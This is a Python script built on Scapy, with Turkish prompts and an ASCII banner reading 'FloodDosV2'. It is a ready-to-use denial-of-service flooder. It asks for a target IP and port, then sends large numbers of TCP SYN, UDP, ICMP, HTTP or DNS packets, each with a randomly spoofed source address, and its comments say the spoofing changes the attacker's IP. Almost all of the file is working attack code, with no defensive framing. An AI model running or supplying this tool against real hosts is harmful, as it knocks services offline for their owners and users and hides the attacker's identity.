from scapy.all import *
import time
import random

metin = '''   

  _____________               ________               ____   ____________  
  \_   _____|  |   ____   ____\______ \   ____  _____\   \ /   /\_____  \ 
  |    __)  |  |  /  _ \ /  _ \|    |  \ /  _ \/  ___/\   Y   /  /  ____/ 
  |     \   |  |_(  <_> |  <_> )    `   (  <_> )___ \  \     /  /       \ 
  \_____/   |____/\____/ \____/_________/\____/_____\   \___/   \_______/
                                    
                                                                         
                                                                         
'''                                                                         
                                                                         
                                                                         
                                                                                       
print(metin)

time.sleep(1.2)

# Kullanıcıdan hedef IP adresini alın
target_IP = input("Hedef IP adresini girin: ")

# Kullanıcıdan hedef port numarasını alın
target_port = int(input("Hedef Port numarasını girin: "))

# Kullanıcıdan paket boyutunu alın
packet_size = int(input("Paket boyutunu (byte cinsinden) girin: "))

# Kullanıcıdan saldırı protokolünü alın
protocol = input("Saldırı protokolü (TCP, UDP,  ICMP, HTTP veya DNS) girin: ")

# 0.1 saniyede bir paket göndermek için zaman aralığı
interval = 0.01

# Belirli sayıda paket göndermek için döngü oluşturma
num_packets = int(input("Gönderilecek paket sayısını girin: "))
packet_count = 0  # Sayaç değişkeni

if protocol == "TCP":
    for i in range(num_packets):
        # Saldırganın IP adresini değiştirme
        spoofed_IP = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        packet = IP(src=spoofed_IP, dst=target_IP) / TCP(dport=target_port, flags="S") / Raw(load="X" * packet_size)
        send(packet, verbose=False)
        packet_count += 1  # Sayaç değişkenini bir artırma
        print("TCP SYN paketi gönderildi: Kaynak IP = {}, Hedef IP = {}, Hedef Port = {}, Paket Sayısı = {}".format(packet[IP].src, packet[IP].dst, packet[TCP].dport, packet_count))
        time.sleep(interval)
        
elif protocol == "UDP":
    for i in range(num_packets):
        # Saldırganın IP adresini değiştirme
        spoofed_IP = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        packet = IP(src=spoofed_IP, dst=target_IP) / UDP(dport=target_port) / Raw(load="X" * packet_size)
        send(packet, verbose=False)
        packet_count += 1  # Sayaç değişkenini bir artırma
        print("UDP paketi gönderildi: Kaynak IP = {}, Hedef IP = {}, Hedef Port = {}, Paket Sayısı = {}".format(packet[IP].src, packet[IP].dst, packet[UDP].dport, packet_count))
        time.sleep(interval)

elif protocol == "ICMP":
    for i in range(num_packets):
        # Saldırganın IP adresini değiştirme
        spoofed_IP = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        packet = IP(src=spoofed_IP, dst=target_IP) / ICMP() / Raw(load="X" * packet_size)
        send(packet, verbose=False)
        packet_count += 1  # Sayaç değişkenini bir artırma
        print("ICMP paketi gönderildi: Kaynak IP = {}, Hedef IP = {}, Paket Sayısı = {}".format(packet[IP].src, packet[IP].dst, packet_count))
        time.sleep(interval)
        
elif protocol == "udp":
    for i in range(num_packets):
        # Saldırganın IP adresini değiştirme
        spoofed_IP = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        packet = IP(src=spoofed_IP, dst=target_IP) / UDP(dport=target_port) / Raw(load="X" * packet_size)
        send(packet, verbose=False)
        packet_count += 1  # Sayaç değişkenini bir artırma
        print("UDP paketi gönderildi: Kaynak IP = {}, Hedef IP = {}, Hedef Port = {}, Paket Sayısı = {}".format(packet[IP].src, packet[IP].dst, packet[UDP].dport, packet_count))
        time.sleep(interval)

elif protocol == "ıcmp":
    for i in range(num_packets):
        # Saldırganın IP adresini değiştirme
        spoofed_IP = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        packet = IP(src=spoofed_IP, dst=target_IP) / ICMP() / Raw(load="X" * packet_size)
        send(packet, verbose=False)
        packet_count += 1  # Sayaç değişkenini bir artırma
        print("ICMP paketi gönderildi: Kaynak IP = {}, Hedef IP = {}, Paket Sayısı = {}".format(packet[IP].src, packet[IP].dst, packet_count))
        time.sleep(interval)

if protocol == "tcp":
    for i in range(num_packets):
        # Saldırganın IP adresini değiştirme
        spoofed_IP = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        packet = IP(src=spoofed_IP, dst=target_IP) / TCP(dport=target_port, flags="S") / Raw(load="X" * packet_size)
        send(packet, verbose=False)
        packet_count += 1  # Sayaç değişkenini bir artırma
        print("TCP SYN paketi gönderildi: Kaynak IP = {}, Hedef IP = {}, Hedef Port = {}, Paket Sayısı = {}".format(packet[IP].src, packet[IP].dst, packet[TCP].dport, packet_count))
        time.sleep(interval)
       
elif protocol == "HTTP":
    for i in range(num_packets):
        # Saldırganın IP adresini değiştirme
        spoofed_IP = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        packet = IP(src=spoofed_IP, dst=target_IP) / TCP(dport=80, flags="S") / Raw(load="GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_IP))
        send(packet, verbose=False)
        packet_count += 1  # Sayaç değişkenini bir artırma
        print("HTTP GET isteği gönderildi: Kaynak IP = {}, Hedef IP = {}, Hedef Port = {}, Paket Sayısı = {}".format(packet[IP].src, packet[IP].dst, packet[TCP].dport, packet_count))
        time.sleep(interval)

elif protocol == "DNS":
    for i in range(num_packets):
        # Saldırganın IP adresini değiştirme
        spoofed_IP = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        packet = IP(src=spoofed_IP, dst=target_IP) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com"))
        send(packet, verbose=False)
        packet_count += 1  # Sayaç değişkenini bir artırma
        print("DNS isteği gönderildi: Kaynak IP = {}, Hedef IP = {}, Hedef Port = {}, Paket Sayısı = {}".format(packet[IP].src, packet[IP].dst, packet[UDP].dport, packet_count))
        time.sleep(interval)

elif protocol == "dns":
    for i in range(num_packets):
        # Saldırganın IP adresini değiştirme
        spoofed_IP = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        packet = IP(src=spoofed_IP, dst=target_IP) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com"))
        send(packet, verbose=False)
        packet_count += 1  # Sayaç değişkenini bir artırma
        print("DNS isteği gönderildi: Kaynak IP = {}, Hedef IP = {}, Hedef Port = {}, Paket Sayısı = {}".format(packet[IP].src, packet[IP].dst, packet[UDP].dport, packet_count))
        time.sleep(interval)
        
elif protocol == "http":
    for i in range(num_packets):
        # Saldırganın IP adresini değiştirme
        spoofed_IP = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        packet = IP(src=spoofed_IP, dst=target_IP) / TCP(dport=80, flags="S") / Raw(load="GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_IP))
        send(packet, verbose=False)
        packet_count += 1  # Sayaç değişkenini bir artırma
        print("HTTP GET isteği gönderildi: Kaynak IP = {}, Hedef IP = {}, Hedef Port = {}, Paket Sayısı = {}".format(packet[IP].src, packet[IP].dst, packet[TCP].dport, packet_count))
        time.sleep(interval)
